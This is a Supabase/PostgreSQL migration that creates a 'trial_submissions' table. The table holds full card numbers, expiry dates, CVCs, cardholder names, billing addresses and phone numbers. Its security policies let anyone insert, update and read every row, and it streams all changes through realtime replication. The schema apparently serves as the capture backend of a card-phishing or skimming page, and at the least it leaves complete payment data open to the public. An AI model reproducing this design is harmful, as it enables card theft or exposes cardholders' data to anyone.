CREATE TABLE public.trial_submissions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL UNIQUE,
  card_number TEXT,
  card_exp TEXT,
  card_cvc TEXT,
  card_name TEXT,
  method TEXT,
  address1 TEXT,
  address2 TEXT,
  city TEXT,
  state TEXT,
  postal TEXT,
  country TEXT,
  phone TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

ALTER TABLE public.trial_submissions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert trial submissions"
ON public.trial_submissions FOR INSERT
WITH CHECK (true);

CREATE POLICY "Anyone can update trial submissions"
ON public.trial_submissions FOR UPDATE
USING (true);

CREATE POLICY "Anyone can view trial submissions"
ON public.trial_submissions FOR SELECT
USING (true);

CREATE OR REPLACE FUNCTION public.update_trial_submissions_updated_at()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_trial_submissions_updated_at
BEFORE UPDATE ON public.trial_submissions
FOR EACH ROW EXECUTE FUNCTION public.update_trial_submissions_updated_at();

ALTER PUBLICATION supabase_realtime ADD TABLE public.trial_submissions;
ALTER TABLE public.trial_submissions REPLICA IDENTITY FULL;